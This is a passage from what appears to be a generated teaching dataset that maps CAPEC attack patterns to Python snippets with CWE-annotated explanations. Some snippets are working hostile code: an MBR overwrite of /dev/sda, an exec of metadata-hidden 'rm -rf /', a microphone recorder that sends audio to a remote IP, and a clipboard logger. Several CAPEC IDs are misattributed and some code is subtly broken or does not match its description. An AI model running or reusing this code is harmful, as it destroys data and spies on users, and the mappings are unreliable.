        "code_snippet": "import socket\n\nclass RogueBaseStation:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n\n    def start(self):\n        print(f'Rogue Base Station running on {self.host}:{self.port}')\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Connection from {addr}')\n            self.handle_client(client_socket)\n\n    def handle_client(self, client_socket):\n        try:\n            data = client_socket.recv(1024)\n            if data:\n                print(f'Received data: {data}')\n                # Simulate improper verification of source\n                client_socket.sendall(b'Welcome to the Rogue Base Station')\n        finally:\n            client_socket.close()\n\nif __name__ == '__main__':\n    rogue_base_station = RogueBaseStation()\n    rogue_base_station.start()",
        "description": "This Python code snippet represents a simplified version of a rogue base station attack. The `RogueBaseStation` class sets up a server socket that listens for incoming connections on a specified host and port. When a client connects, the server accepts the connection and handles the client by receiving data and sending a response. The code demonstrates several vulnerabilities: it does not verify the source of the communication (CWE-940), does not ensure the integrity of the communication channel (CWE-300, CWE-924), and does not restrict the communication channel to intended endpoints (CWE-923). This setup allows an attacker to impersonate a legitimate base station and potentially intercept or manipulate communications from cellular devices that connect to it."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import requests\n\n# Vulnerable function to send a broadcast message\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\ndef send_broadcast_message(phone_number, message):\n    # Sensitive information (phone number) is included in the request\n    data = {\n        'phone_number': phone_number,\n        'message': message\n    }\n    # Sending broadcast message without verifying the source\n    response = requests.post('http://example.com/send_broadcast', json=data)\n    return response.status_code\n\n# Example usage\nphone_number = '1234567890'\nmessage = 'Emergency Alert!'\nstatus = send_broadcast_message(phone_number, message)\nprint(f'Message sent with status code: {status}')",
        "description": "This Python code snippet demonstrates a vulnerable function `send_broadcast_message` that sends a broadcast message to a specified phone number. The function embodies the main idea of the CAPEC 'Cellular Broadcast Message Request' by sending a broadcast message to a mobile device based on its phone number. The code includes several weaknesses:\n\n1. CWE-201: The phone number, which is sensitive information, is included in the data sent to the server.\n2. CWE-940: The function does not verify the source of the communication channel, making it susceptible to unauthorized requests.\n3. CWE-300: The communication channel is accessible by non-endpoints, as there is no verification of the actors at both ends.\n\nThis code represents the potential for an attacker to exploit these weaknesses to send broadcast messages and determine the location of a target mobile device."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Simulate a device broadcasting its WiFi MAC address\nMAC_ADDRESS = '00:0a:95:9d:68:16'\n\n# Function to simulate sending a broadcast message\ndef send_broadcast_message(mac_address):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n    message = f'Device MAC: {mac_address}'\n    sock.sendto(message.encode(), ('<broadcast>', 37020))\n    sock.close()\n\n# Function to simulate receiving a broadcast message\ndef receive_broadcast_message():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind(('', 37020))\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received message: {data.decode()} from {addr}')\n\n# Simulate the device broadcasting its MAC address periodically\nwhile True:\n    send_broadcast_message(MAC_ADDRESS)\n    time.sleep(5)",
        "description": "This Python code snippet simulates a device broadcasting its WiFi MAC address periodically. The `send_broadcast_message` function sends a broadcast message containing the device's MAC address, while the `receive_broadcast_message` function listens for incoming broadcast messages. This setup embodies the main idea of the CAPEC 'Signal Strength Tracking' by demonstrating how an attacker could passively monitor the signal strength of the target's WiFi signal to identify the source location. The code also touches on related CWEs, such as CWE-201 (Insertion of Sensitive Information Into Sent Data) by broadcasting the MAC address, and CWE-1300 (Improper Protection of Physical Side Channels) by not protecting the broadcasted information."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import ssl\nimport socket\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but force a lower encryption level (e.g., SSLv3)\ncontext = ssl.SSLContext(ssl.PROTOCOL_SSLv3)\n\n# Insecure: Allowing the use of a less secure algorithm\ncontext.set_ciphers('DES-CBC3-SHA')\n\n# Connect to a server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send sensitive data\nwrapped_socket.send(b'Sensitive Information')\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker forces the encryption level to be lowered, making the encrypted data vulnerable. The code creates an SSL context using the outdated and insecure SSLv3 protocol and sets a weak cipher suite (DES-CBC3-SHA). This embodies the CAPEC 'Drop Encryption Level' by selecting a less secure algorithm during negotiation (CWE-757) and using inadequate encryption strength (CWE-326). The code then connects to a server and sends sensitive information, which could be intercepted due to the weak encryption. This example highlights the risks of using outdated and weak encryption methods."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\n\n# Simulate sending sensitive data over a network\nsensitive_data = 'user_password=12345'\n\n# Create a socket object\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a server (example IP and port)\ns.connect(('192.168.1.1', 8080))\n\n# Send data with observable timing discrepancies\nfor char in sensitive_data:\n    s.send(char.encode())\n    time.sleep(0.1)  # Introduce a delay to simulate timing channel\n\ns.close()",
        "description": "This Python code snippet demonstrates a scenario where sensitive information (a user password) is transmitted over a network with observable timing discrepancies. The code creates a socket connection to a server and sends the sensitive data character by character, introducing a delay between each character transmission. This delay can be exploited by an attacker to analyze packet timing and infer the sensitive information, even if the data itself is encrypted. The code embodies the main idea of CAPEC 'Analysis of Packet Timing and Sizes' and incorporates related CWEs such as 'Insertion of Sensitive Information Into Sent Data' (CWE-201), 'Cleartext Transmission of Sensitive Information' (CWE-319), and 'Observable Timing Discrepancy' (CWE-208)."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import os\nimport time\nimport random\nimport hashlib\n\n# Simulate cryptographic processing\nclass CryptoDevice:\n    def __init__(self, key):\n        self.key = key\n\n    def process_data(self, data):\n        # Simulate a risky cryptographic algorithm (CWE-327)\n        hash_object = hashlib.md5(data.encode() + self.key.encode())\n        return hash_object.hexdigest()\n\n# Simulate a device with improper protection against side-channel attacks (CWE-1300)\nclass VulnerableDevice(CryptoDevice):\n    def process_data(self, data):\n        # Simulate electromagnetic emissions by printing processing steps\n        print(f\"Processing data: {data}\")\n        time.sleep(random.uniform(0.01, 0.1))  # Simulate processing time\n        result = super().process_data(data)\n        print(f\"Processed result: {result}\")\n        return result\n\n# Example usage\nkey = \"supersecretkey\"\ndevice = VulnerableDevice(key)\n\n# Simulate sensitive data processing\nsensitive_data = \"SensitiveInformation\"\ndevice.process_data(sensitive_data)\n\n# Note: In a real-world scenario, an attacker could monitor the electromagnetic emissions\n# during the processing of sensitive data to derive the cryptographic key or the data itself.",
        "description": "This Python code snippet simulates a cryptographic device that processes sensitive data using a risky cryptographic algorithm (MD5, CWE-327). The `VulnerableDevice` class extends the `CryptoDevice` class and simulates electromagnetic emissions by printing processing steps and introducing random delays. This represents a device with improper protection against electromagnetic side-channel attacks (CWE-1300). An attacker could potentially monitor these emissions to derive sensitive information, such as cryptographic keys, during the processing of sensitive data. The code highlights the vulnerability to electromagnetic side-channel attacks as described in the CAPEC."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.sensitive_data = 'SECRET_KEY'\n\n    def process_data(self, data):\n        # Simulate processing time with variable delay\n        time.sleep(random.uniform(0.1, 0.5))\n        # Simulate power consumption variation\n        power_consumption = random.uniform(0.5, 1.5)\n        print(f'Processing data: {data}, Power consumption: {power_consumption}')\n        return f'Processed {data}'\n\n    def send_data(self, data):\n        # Inserting sensitive information into sent data\n        sent_data = f'{data}:{self.sensitive_data}'\n        print(f'Sending data: {sent_data}')\n        return sent_data\n\n# Example usage\nif __name__ == '__main__':\n    device = Device()\n    processed_data = device.process_data('user_input')\n    device.send_data(processed_data)",
        "description": "This Python code snippet simulates a device that processes and sends data, embodying the concept of a Compromising Emanations Attack. The `Device` class contains sensitive information (`SECRET_KEY`) and methods to process and send data. The `process_data` method introduces variable delays and power consumption variations, representing physical side channels that could be exploited by an attacker. The `send_data` method improperly includes sensitive information in the transmitted data, demonstrating CWE-201. This code highlights vulnerabilities related to physical side channels and the improper handling of sensitive information, aligning with the CAPEC description."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "import time\nimport random\n\nclass Device:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.voltage = 3.3  # Normal operating voltage\n        self.clock_speed = 1.0  # Normal clock speed\n        self.temperature = 25  # Normal temperature in Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        if self.voltage < 2.5 or self.clock_speed > 1.5 or self.temperature < -10 or self.temperature > 85:\n            raise ValueError('Faulty behavior detected')\n        return 'encrypted_data'\n\n    def fault_injection_attack(self):\n        # Simulate voltage glitch\n        self.voltage = random.uniform(1.0, 2.0)\n        # Simulate clock glitch\n        self.clock_speed = random.uniform(1.5, 2.0)\n        # Simulate temperature extremes\n        self.temperature = random.choice([-20, 100])\n\n    def reset_conditions(self):\n        self.voltage = 3.3\n        self.clock_speed = 1.0\n        self.temperature = 25\n\n# Simulate the attack\ndevice = Device()\ntry:\n    device.fault_injection_attack()\n    encrypted_data = device.perform_cryptographic_operation()\nexcept ValueError as e:\n    print(f'Error: {e}')\nfinally:\n    device.reset_conditions()",
        "description": "This Python code snippet simulates a hardware fault injection attack on a device performing cryptographic operations. The `Device` class represents an electronic device with normal operating conditions for voltage, clock speed, and temperature. The `perform_cryptographic_operation` method simulates a cryptographic operation that raises an error if the device is operating under faulty conditions. The `fault_injection_attack` method simulates various fault injection techniques, such as voltage glitches, clock glitches, and extreme temperatures, which can cause the device to behave incorrectly. The `reset_conditions` method restores the device to its normal operating conditions. This code embodies the main idea of CAPEC-1247, demonstrating how an adversary can exploit hardware vulnerabilities to induce faulty behavior and potentially compromise sensitive information."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "import time\n\nclass MobileDevice:\n    def __init__(self):\n        self.secret_key = 'super_secret_key'\n        self.clock_speed = 1.0  # GHz\n        self.voltage = 1.0  # Volts\n        self.temperature = 25  # Celsius\n\n    def perform_cryptographic_operation(self):\n        # Simulate a cryptographic operation\n        time.sleep(1)\n        return 'encrypted_data'\n\n    def check_conditions(self):\n        if self.clock_speed < 0.8 or self.clock_speed > 1.2:\n            raise ValueError('Clock glitch detected!')\n        if self.voltage < 0.9 or self.voltage > 1.1:\n            raise ValueError('Voltage glitch detected!')\n        if self.temperature < 0 or self.temperature > 85:\n            raise ValueError('Temperature out of range!')\n\n    def execute(self):\n        try:\n            self.check_conditions()\n            return self.perform_cryptographic_operation()\n        except ValueError as e:\n            print(f'Error: {e}')\n            return None\n\n# Example usage\nmobile_device = MobileDevice()\n# Simulate a fault injection by changing clock speed\nmobile_device.clock_speed = 0.5\nresult = mobile_device.execute()\nprint(f'Result: {result}')",
        "description": "This Python code snippet represents a simplified model of a mobile device performing a cryptographic operation. The `MobileDevice` class includes attributes for clock speed, voltage, and temperature, which are critical parameters that can be manipulated in fault injection attacks. The `check_conditions` method simulates the detection of anomalies in these parameters, raising an error if they fall outside expected ranges. The `execute` method attempts to perform a cryptographic operation, but first checks the conditions to ensure no fault injection has occurred. If a fault is detected, an error is raised, and the operation is aborted. This code embodies the main idea of CAPEC-1247 by demonstrating how improper protection against voltage and clock glitches can be exploited, and it also touches on related CWEs by simulating the detection of such faults."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import cv2\nimport numpy as np\n\n# Simulate capturing an image of a touchscreen device\nimage = cv2.imread('touchscreen_image.jpg', cv2.IMREAD_GRAYSCALE)\n\n# Apply a threshold to highlight smudges\n_, smudges = cv2.threshold(image, 200, 255, cv2.THRESH_BINARY)\n\n# Find contours of the smudges\ncontours, _ = cv2.findContours(smudges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n\n# Draw contours on the original image\ncv2.drawContours(image, contours, -1, (0, 255, 0), 3)\n\n# Save the result to visualize the smudge pattern\ncv2.imwrite('smudge_pattern.jpg', image)\n\nprint('Smudge pattern detected and saved as smudge_pattern.jpg')",
        "description": "This Python code snippet simulates a smudge attack on a touchscreen device. It uses OpenCV to process an image of the touchscreen, highlighting oil smudges left by the user's fingers. The code reads an image, applies a threshold to emphasize the smudges, finds the contours of these smudges, and then draws these contours on the original image. The result is saved as 'smudge_pattern.jpg', which can be analyzed to infer the password/passcode pattern. This demonstrates the vulnerability described in the CAPEC by showing how physical side channels (oil smudges) can be exploited to reveal sensitive information."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import time\nimport random\n\nclass GPSReceiver:\n    def __init__(self):\n        self.position = (0.0, 0.0)\n        self.time = time.time()\n\n    def receive_signal(self, signal):\n        # CWE-940: No verification of the source of the signal\n        self.position, self.time = signal\n\n    def get_position(self):\n        return self.position\n\n    def get_time(self):\n        return self.time\n\n# Simulate a legitimate GPS signal\nlegit_signal = ((37.7749, -122.4194), time.time())\n\n# Simulate a counterfeit GPS signal\ncounterfeit_signal = ((40.7128, -74.0060), time.time() + random.randint(1000, 10000))\n\n# Create GPS receiver instance\ngps_receiver = GPSReceiver()\n\n# Receive counterfeit signal\ngps_receiver.receive_signal(counterfeit_signal)\n\n# Output the spoofed position and time\nprint(\"Spoofed Position:\", gps_receiver.get_position())\nprint(\"Spoofed Time:\", gps_receiver.get_time())",
        "description": "This Python code snippet simulates a GPS receiver that can be deceived by counterfeit GPS signals, embodying the main idea of the CAPEC 'Counterfeit GPS Signals'. The GPSReceiver class has methods to receive signals and retrieve the current position and time. The receive_signal method does not verify the source of the signal (CWE-940), allowing it to accept spoofed signals. The code demonstrates how an adversary can send a counterfeit GPS signal to the receiver, causing it to report an incorrect position and time. This represents the vulnerability where the receiver is misled by spoofed signals, leading to incorrect location and time data."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import time\nimport random\n\nclass GPSSpoofingAttack:\n    def __init__(self, target_receiver):\n        self.target_receiver = target_receiver\n        self.genuine_signal_strength = 1.0\n        self.counterfeit_signal_strength = 0.1\n        self.spoofed_location = (0.0, 0.0)\n\n    def broadcast_signals(self):\n        while True:\n            # Simulate increasing counterfeit signal strength\n            self.counterfeit_signal_strength += 0.01\n            if self.counterfeit_signal_strength > self.genuine_signal_strength:\n                self.target_receiver.location = self.spoofed_location\n            time.sleep(1)\n\nclass GPSReceiver:\n    def __init__(self):\n        self.location = (random.uniform(-90, 90), random.uniform(-180, 180))\n\n# Simulate a GPS receiver\nreceiver = GPSReceiver()\n\n# Simulate a GPS spoofing attack\nattack = GPSSpoofingAttack(receiver)\nattack.broadcast_signals()",
        "description": "This Python code snippet simulates a GPS spoofing attack, specifically a 'Carry-Off GPS Attack'. The GPSSpoofingAttack class represents the adversary's actions, starting with broadcasting signals synchronized with the genuine signals observed by the target receiver. The counterfeit signal strength is gradually increased, eventually overpowering the genuine signal and causing the target receiver to accept the spoofed location. The GPSReceiver class simulates a GPS receiver that can be manipulated by the spoofing attack. This code embodies the main idea of the CAPEC by demonstrating how an adversary can carry the target away from their intended destination using spoofed signals. The related CWEs are represented by the lack of proper verification and authentication mechanisms in the GPSReceiver, making it vulnerable to spoofing attacks."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import os\nimport time\n\nclass ResourceHandler:\n    def __init__(self):\n        self.resource = None\n\n    def acquire_resource(self):\n        self.resource = open('resource.txt', 'w')\n        self.resource.write('Resource in use')\n        print('Resource acquired')\n\n    def release_resource(self):\n        if self.resource:\n            self.resource.close()\n            print('Resource released')\n\n    def improper_power_consumption(self):\n        while True:\n            print('Consuming power...')\n            time.sleep(1)  # Simulate continuous power consumption\n\n    def handle_device_name(self, user_input):\n        try:\n            with open(user_input, 'r') as file:\n                print(file.read())\n        except Exception as e:\n            print(f'Error: {e}')\n\n    def incorrect_authorization(self, user_role):\n        if user_role == 'admin':\n            print('Access granted')\n        else:\n            print('Access denied')\n\nhandler = ResourceHandler()\nhandler.acquire_resource()\n# Simulate missing release of resource\n# handler.release_resource()\n\n# Simulate improper power consumption\n# handler.improper_power_consumption()\n\n# Simulate improper handling of Windows device names\n# handler.handle_device_name('CON')\n\n# Simulate incorrect authorization\n# handler.incorrect_authorization('user')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Unauthorized Use of Device Resources' and its associated CWEs. The `ResourceHandler` class includes methods that showcase these vulnerabilities:\n\n1. `acquire_resource` and `release_resource`: Demonstrates CWE-772 (Missing Release of Resource after Effective Lifetime) by acquiring a resource and not releasing it.\n2. `improper_power_consumption`: Simulates CWE-920 (Improper Restriction of Power Consumption) by continuously consuming power without restriction.\n3. `handle_device_name`: Illustrates CWE-67 (Improper Handling of Windows Device Names) by attempting to open a file with a potentially dangerous device name.\n4. `incorrect_authorization`: Shows CWE-863 (Incorrect Authorization) by performing a simplistic and flawed authorization check.\n\nThe code is designed to be concise and highlight the main points of the deprecated CAPEC and related CWEs, demonstrating how improper handling of resources and authorization can lead to vulnerabilities."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\ntrusted_domains = ['example.com', 'trusted.com']\n\n@app.route('/redirect')\ndef open_redirect():\n    target = request.args.get('url')\n    if not target:\n        return 'No URL provided', 400\n    # CWE-697: Incorrect Comparison\n    if any(target.startswith(f'http://{domain}') or target.startswith(f'https://{domain}') for domain in trusted_domains):\n        return redirect(target)\n    else:\n        return 'Untrusted URL', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that performs URL redirection based on user input. The main idea is to show how a TypoSquatting attack can be facilitated by an open redirect vulnerability (CWE-601). The code accepts a URL as a query parameter and redirects the user to that URL if it matches any of the trusted domains. However, the comparison logic (CWE-697) is flawed because it only checks if the URL starts with a trusted domain, which can be easily bypassed by an attacker using a subdomain (e.g., 'http://trusted.com.evil.com'). This misinterpretation of input (CWE-115) can lead to users being redirected to malicious sites, exemplifying the TypoSquatting attack."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import re\nimport requests\n\n# Simulate user input for a URL\nuser_input_url = 'http://trustedbank.com/login'\n\n# SoundSquatting attack: adversary registers a similar sounding domain\nadversary_domain = 'http://trustedbanc.com/login'\n\n# Function to check if the URL is trusted\ndef is_trusted_url(url):\n    trusted_domains = ['trustedbank.com']\n    domain = re.findall(r'://(.*?)/', url)[0]\n    return domain in trusted_domains\n\n# Function to redirect user to the input URL\ndef redirect_user(url):\n    if is_trusted_url(url):\n        print(f'Redirecting to {url}')\n    else:\n        print('Warning: Untrusted URL!')\n\n# Simulate a URL redirection based on user input\nredirect_user(user_input_url)\n\n# Simulate a URL redirection to an adversary-controlled domain\nredirect_user(adversary_domain)",
        "description": "This Python code snippet demonstrates a SoundSquatting attack where an adversary registers a domain name that sounds similar to a trusted domain. The code includes a function to check if a URL is trusted by comparing it against a list of trusted domains (CWE-348). It also simulates a URL redirection based on user input (CWE-601). The adversary's domain 'trustedbanc.com' is designed to confuse users into thinking it is the legitimate 'trustedbank.com'. The code highlights the risk of relying on user input for security-critical actions without proper verification."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import re\nfrom urllib.parse import urlparse\n\ndef is_valid_url(url):\n    # CWE-777: Regular Expression without Anchors\n    pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+')\n    return re.match(pattern, url) is not None\n\ndef check_homoglyph(url):\n    # CWE-1007: Insufficient Visual Distinction of Homoglyphs Presented to User\n    trusted_domain = 'example.com'\n    parsed_url = urlparse(url)\n    domain = parsed_url.netloc\n    if domain != trusted_domain:\n        print(f'Warning: The domain {domain} may be a homoglyph of {trusted_domain}')\n\n# CWE-918: Server-Side Request Forgery (SSRF)\ndef fetch_url(url):\n    if is_valid_url(url):\n        check_homoglyph(url)\n        # Simulate a server-side request\n        print(f'Fetching contents from {url}')\n    else:\n        print('Invalid URL')\n\n# Example usage\nfetch_url('http://examp1e.com')",
        "description": "This Python code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The `is_valid_url` function uses a regular expression to validate URLs, but it lacks proper anchoring (CWE-777). The `check_homoglyph` function checks if the domain of the URL is visually similar to a trusted domain (CWE-1007). The `fetch_url` function simulates a server-side request (CWE-918) and warns if the domain might be a homoglyph of a trusted domain. This code highlights the risk of homograph attacks by showing how an attacker could exploit visually similar domain names to deceive users and potentially direct them to malicious sites."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import jwt\nimport datetime\n\n# Simulate a weak secret key\nSECRET_KEY = 'weak_secret'\n\n# Function to generate a token for a given user\ndef generate_token(user_id):\n    payload = {\n        'user_id': user_id,\n        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)\n    }\n    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')\n\n# Function to verify a token\ndef verify_token(token):\n    try:\n        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n        return payload['user_id']\n    except jwt.ExpiredSignatureError:\n        return 'Token expired'\n    except jwt.InvalidTokenError:\n        return 'Invalid token'\n\n# Generate a token for user 'admin'\nadmin_token = generate_token('admin')\nprint(f'Admin Token: {admin_token}')\n\n# Adversary generates a token for user 'admin' using the same weak secret key\nadversary_token = generate_token('admin')\nprint(f'Adversary Token: {adversary_token}')\n\n# Verify the adversary's token\nuser_id = verify_token(adversary_token)\nprint(f'Impersonated User ID: {user_id}')",
        "description": "This Python code snippet demonstrates a token impersonation vulnerability. It uses the JWT (JSON Web Token) library to generate and verify tokens. The SECRET_KEY used for signing the tokens is weak, making it easy for an adversary to generate a valid token for any user, including 'admin'. The code generates a token for 'admin' and then simulates an adversary generating a token for 'admin' using the same weak secret key. The verification function then accepts the adversary's token as valid, demonstrating how improper authentication and weak security token mechanisms can lead to token impersonation attacks."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import os\nimport socket\nimport pyaudio\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Function to capture audio from the microphone\ndef capture_audio(duration=5, rate=44100, chunk=1024):\n    p = pyaudio.PyAudio()\n    stream = p.open(format=pyaudio.paInt16, channels=1, rate=rate, input=True, frames_per_buffer=chunk)\n    frames = []\n    for _ in range(0, int(rate / chunk * duration)):\n        data = stream.read(chunk)\n        frames.append(data)\n    stream.stop_stream()\n    stream.close()\n    p.terminate()\n    return b''.join(frames)\n\n# Function to send captured audio to an external server\n# CWE-319: Cleartext Transmission of Sensitive Information\ndef send_audio(data, server_ip='192.168.1.100', server_port=9999):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((server_ip, server_port))\n        s.sendall(data)\n\n# Main function to capture and send audio\nif __name__ == '__main__':\n    audio_data = capture_audio()\n    send_audio(audio_data)\n",
        "description": "This Python code snippet captures audio from the system's microphone and sends it to an external server. The code demonstrates several vulnerabilities: \n1. CWE-267: The code runs with privileges that allow it to access the microphone and network, which can be exploited to perform unintended actions.\n2. CWE-319: The captured audio data is transmitted in cleartext, making it susceptible to interception by unauthorized actors.\n3. CWE-497: The code exposes sensitive system information (audio data) to an unauthorized control sphere (external server). \nThe main idea of the CAPEC is represented by exploiting the system's audio functionality to capture and transmit sensitive information, potentially for malicious purposes."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import os\n\n# Function to handle file upload\ndef handle_file_upload(file_path):\n    # Check the file extension\n    if file_path.endswith('.txt'):\n        # Open the file assuming it's a text file\n        with open(file_path, 'r') as file:\n            content = file.read()\n            print('File content:', content)\n    else:\n        print('Unsupported file type')\n\n# Simulate file upload\nuploaded_file = 'malicious.exe.txt'\nhandle_file_upload(uploaded_file)",
        "description": "This Python code snippet demonstrates a vulnerability where the file extension is used to determine how to handle the file. The `handle_file_upload` function checks if the uploaded file has a `.txt` extension and then reads and prints its content. However, an attacker can upload a file with a deceptive name like `malicious.exe.txt`, which bypasses the extension check and gets processed as a text file. This can lead to the execution of malicious code or other unintended behaviors. The code embodies the main idea of CAPEC-176 (Alternative Execution Due to Deceptive Filenames) and highlights related weaknesses such as CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import os\n\n# Function to hide malicious code in a file's metadata\nfrom PIL import Image\n\n# Create an image and save it\nimage = Image.new('RGB', (100, 100), color = 'red')\nimage.save('example.png')\n\n# Open the image and add malicious data to its metadata\nimage = Image.open('example.png')\nmetadata = image.info\nmetadata['malicious_code'] = 'import os\\nos.system(\"rm -rf /\")'\n\n# Save the image with the malicious metadata\nimage.save('example_with_malicious_metadata.png', pnginfo=metadata)\n\n# Function to extract and execute malicious code from metadata\ndef execute_malicious_code(file_path):\n    image = Image.open(file_path)\n    metadata = image.info\n    if 'malicious_code' in metadata:\n        exec(metadata['malicious_code'])\n\n# Example usage (commented out to prevent accidental execution)\n# execute_malicious_code('example_with_malicious_metadata.png')",
        "description": "This Python code snippet demonstrates how an attacker can hide malicious code within the metadata of an image file, which aligns with the CAPEC description of 'Hiding Malicious Data or Code within Files'. The code first creates a simple image and saves it. Then, it reopens the image and adds a piece of malicious code to its metadata. Finally, it saves the image with the malicious metadata. The function 'execute_malicious_code' is designed to extract and execute the hidden malicious code from the image's metadata. This example highlights the CWE-506 (Embedded Malicious Code) and CWE-515 (Covert Storage Channel) by embedding and potentially executing hidden code within a file's metadata."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\nimport time\n\n# Simulate a malicious application that logs clipboard data\nlog_file = 'clipboard_log.txt'\n\nwhile True:\n    clipboard_data = pyperclip.paste()\n    with open(log_file, 'a') as f:\n        f.write(f'{clipboard_data}\\n')\n    time.sleep(5)  # Log clipboard data every 5 seconds",
        "description": "This Python code snippet demonstrates a simple malicious application that continuously monitors and logs clipboard data to a file. The `pyperclip` library is used to access the clipboard contents, which are then written to a log file (`clipboard_log.txt`) every 5 seconds. This embodies the CAPEC 'Collect Data from Clipboard' by showing how an adversary can exploit clipboard functionality to gather sensitive information. The code also touches on related CWEs: it stores sensitive information in cleartext (CWE-318, CWE-317) and exposes this information to unauthorized control (CWE-497)."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import os\nimport struct\n\n# Simulate reading the MBR\nwith open('/dev/sda', 'rb') as disk:\n    mbr = disk.read(512)\n\n# Check for existing boot code\nif mbr[510:512] != b'\\x55\\xAA':\n    raise ValueError('Invalid MBR signature')\n\n# Malicious payload to be written to MBR\nmalicious_code = b'\\xEB\\xFE' + b'\\x00' * 510 + b'\\x55\\xAA'\n\n# Simulate writing the malicious payload to the MBR\nwith open('/dev/sda', 'wb') as disk:\n    disk.write(malicious_code)\n\nprint('MBR has been altered with malicious code.')",
        "description": "This Python code snippet demonstrates a simplified version of an attack that alters the Master Boot Record (MBR) of a hard disk drive (HDD) to include malicious code. The code first reads the existing MBR to ensure it has a valid signature. It then constructs a malicious payload and writes it back to the MBR. This represents the CAPEC scenario where an adversary exploits improperly protected firmware to gain persistence on a system. The related CWEs provide context on potential weaknesses, such as insufficient access control and the inability to update firmware, which could be exploited in such an attack."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file to store sensitive information\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: Password123')\n    temp_file_path = temp_file.name\n\n# Improperly set file permissions (world-readable)\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n\n# Simulate an error that exposes the file path\ntry:\n    raise RuntimeError('Simulated error')\nexcept RuntimeError as e:\n    print(f'Error occurred: {e}')\n    print(f'Sensitive file path: {temp_file_path}')",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is stored in a temporary file with improper permissions, making it accessible to unauthorized users. The file is created with world-readable permissions (0o644), which means any user on the system can read its contents. Additionally, the code simulates an error that exposes the file path, potentially revealing the location of the sensitive information to an attacker. This example embodies the main idea of the CAPEC 'Probe System Files' and incorporates related CWEs such as insecure temporary files (CWE-377), files accessible to external parties (CWE-552), and exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
